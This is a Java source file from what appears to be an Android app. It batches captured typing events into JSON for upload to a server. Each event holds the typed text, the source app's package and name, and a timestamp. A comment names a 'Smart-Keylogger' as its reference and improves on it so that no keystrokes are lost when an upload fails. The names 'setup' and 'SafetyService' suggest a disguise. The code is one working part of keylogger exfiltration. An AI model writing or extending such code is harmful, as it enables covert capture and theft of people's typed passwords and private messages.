package com.example.setup;

import java.util.ArrayList;
import java.util.List;

/**
 * Pure (Android-free) batching for captured typing events.
 *
 * Why: one HTTP POST per keystroke burst drains the radio. The Smart-Keylogger
 * reference batches 1s / 5 events but clears its pending list before the upload
 * succeeds, so a failed POST loses the events. This class is only the
 * serialization/queue half; SafetyService puts events back on disk if the POST
 * is not 2xx.
 *
 * No android.* / org.json here so it runs in plain JVM unit tests.
 */
public final class TypingBatch {

    public static final class Event {
        public final String text;
        public final String pkg;
        public final String app;
        public final long time;
        public final int seq;

        public Event(String text, String pkg, String app, long time, int seq) {
            this.text = text;
            this.pkg = pkg;
            this.app = app;
            this.time = time;
            this.seq = seq;
        }

        /** One self-contained JSON object — also the spool line format. */
        public String toJson() {
            StringBuilder sb = new StringBuilder(128);
            sb.append("{\"query\":\"").append(escape(text)).append('"');
            if (pkg != null) sb.append(",\"pkg\":\"").append(escape(pkg)).append('"');
            if (app != null) sb.append(",\"app\":\"").append(escape(app)).append('"');
            sb.append(",\"time\":").append(time);
            sb.append(",\"seq\":").append(seq);
            sb.append('}');
            return sb.toString();
        }
    }

    private final List<Event> events = new ArrayList<>();
    private final int maxEvents;

    public TypingBatch(int maxEvents) {
        this.maxEvents = Math.max(1, maxEvents);
    }

    /** @return true when the batch is full and should be flushed now. */
    public synchronized boolean add(Event event) {
        if (event == null) return false;
        events.add(event);
        return events.size() >= maxEvents;
    }

    public synchronized List<Event> drain() {
        List<Event> out = new ArrayList<>(events);
        events.clear();
        return out;
    }

    public synchronized int size() {
        return events.size();
    }

    /** Request body: {"device":"...","events":[{...},{...}]} */
    public static String toJson(String device, List<Event> list) {
        StringBuilder sb = new StringBuilder(160 + list.size() * 128);
        sb.append("{\"device\":\"").append(escape(device)).append("\",\"events\":[");
        for (int i = 0; i < list.size(); i++) {
            if (i > 0) sb.append(',');
            sb.append(list.get(i).toJson());
        }
        sb.append("]}");
        return sb.toString();
    }

    /** Same envelope for spool replay, whose lines are already JSON objects. */
    public static String wrap(String device, List<String> rawEventJson) {
        StringBuilder sb = new StringBuilder(160 + rawEventJson.size() * 128);
        sb.append("{\"device\":\"").append(escape(device)).append("\",\"events\":[");
        for (int i = 0; i < rawEventJson.size(); i++) {
            if (i > 0) sb.append(',');
            sb.append(rawEventJson.get(i));
        }
        sb.append("]}");
        return sb.toString();
    }

    /** Minimal JSON string escaping (quotes, backslashes, controls, CR/LF). */
    static String escape(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder(s.length() + 8);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"': sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default:
                    if (c < 0x20) {
                        String hex = Integer.toHexString(c);
                        sb.append("\\u");
                        for (int p = hex.length(); p < 4; p++) sb.append('0');
                        sb.append(hex);
                    } else {
                        sb.append(c);
                    }
            }
        }
        return sb.toString();
    }
}
